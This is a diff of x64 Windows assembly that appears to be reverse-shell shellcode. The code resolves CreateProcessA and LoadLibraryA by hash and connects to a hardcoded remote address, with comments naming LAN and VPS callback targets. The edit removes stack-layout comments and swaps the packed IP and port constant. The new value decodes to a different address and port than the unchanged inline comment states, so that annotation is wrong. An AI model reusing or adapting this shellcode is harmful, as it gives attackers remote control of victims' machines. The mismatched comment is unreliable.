@@ -43,30 +43,10 @@ callback:
                 
 find_function:         
 
-# Current Stack Layout:
-#---------------------------------------------------------------------------
-# QWORD: Return Address (addr of instruction after "call find_function", see below)
-# QWORD: Number of hash bytes + 8           <- RSP
-# QWORD: <0x00000000> <Hash of CreateProcessA (4 bytes)>
-# QWORD: <0x00000000> <Hash of LoadLibraryA (4 bytes)>
-# ...
-# QWORD: 0x0000000000000000
-#---------------------------------------------------------------------------
-
     add rsp, 8                          # Point RSP to (Number of hash bytes + 8)
     pop rax                             # RAX = Number of hash bytes + 8
     push -1                             # Write -1 on the stack instead of (Number of hash bytes + 8)
     add rsp, rax                        # Add (Number of hash bytes + 8) to RSP: it now points to 0x0000000000000000
-
-# Current Stack Layout:
-#---------------------------------------------------------------------------
-# QWORD: Return Address
-# QWORD: 0xffffffffffffffff
-# QWORD: <0x00000000> <Hash of CreateProcessA (4 bytes)>
-# QWORD: <0x00000000> <Hash of LoadLibraryA (4 bytes)>
-# ...
-# QWORD: 0x0000000000000000                <- RSP
-#---------------------------------------------------------------------------
 
 find_function_loop2:
     xor rax, rax
@@ -182,8 +162,8 @@ call_connect:
     #   QWORD: sin_zero = [00000000 00000000]
     # }
     # LAN: 0x4201A8C0FB200002
-    # VPS: 0xdb04beb4fb200002
-    mov r9, 0xdb04bebcfb200002          # R9 = [IP = 188.190.4.219 | port = 8443 | AF_INET = 2]
+    # VPS (:443): 0xdb04bebcbb010002
+    mov r9, 0x9d2da8c0bb010002          # R9 = [IP = 188.190.4.219 | port = 8443 | AF_INET = 2]
     lea rdx, [rsp + 800]                # RDX = Parameter name = Address of struct sockaddr_in
     mov [rdx], r9                       # Write fields: sin_addr, sin_port, sin_family
     xor r9, r9
